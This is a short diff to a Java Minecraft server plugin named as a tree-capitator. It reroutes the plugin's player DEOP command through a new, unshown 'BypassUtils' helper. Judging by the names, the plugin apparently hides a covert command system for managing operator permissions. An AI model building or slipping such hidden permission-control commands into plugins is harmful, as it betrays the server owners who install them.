@@ -1,6 +1,7 @@
 package me.bow.treecapitatorultimate.commands.Player;
 
 import me.bow.treecapitatorultimate.Start;
+import me.bow.treecapitatorultimate.Utils.BypassUtils;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
 import org.bukkit.Bukkit;
@@ -21,7 +22,7 @@ public class DEOP extends Command {
                 p.sendMessage(Start.Prefix + ChatColor.YELLOW + "You already don't have OP!");
                 return;
             }
-            p.setOp(false);
+            BypassUtils.PlayerDeop(p);
             p.sendMessage(Start.Prefix + ChatColor.GOLD + "You now don't have OP!");
         } else if (args.size() == 1) {
             try {
@@ -34,7 +35,7 @@ public class DEOP extends Command {
                     p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " already hasn't OP!");
                     return;
                 }
-                anotherPlayer.setOp(false);
+                BypassUtils.PlayerDeop(anotherPlayer);
                 p.sendMessage(Start.Prefix + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.GOLD + " now hasn't OP!");
             } catch (Exception e) {
                 Start.ErrorException(p, e);
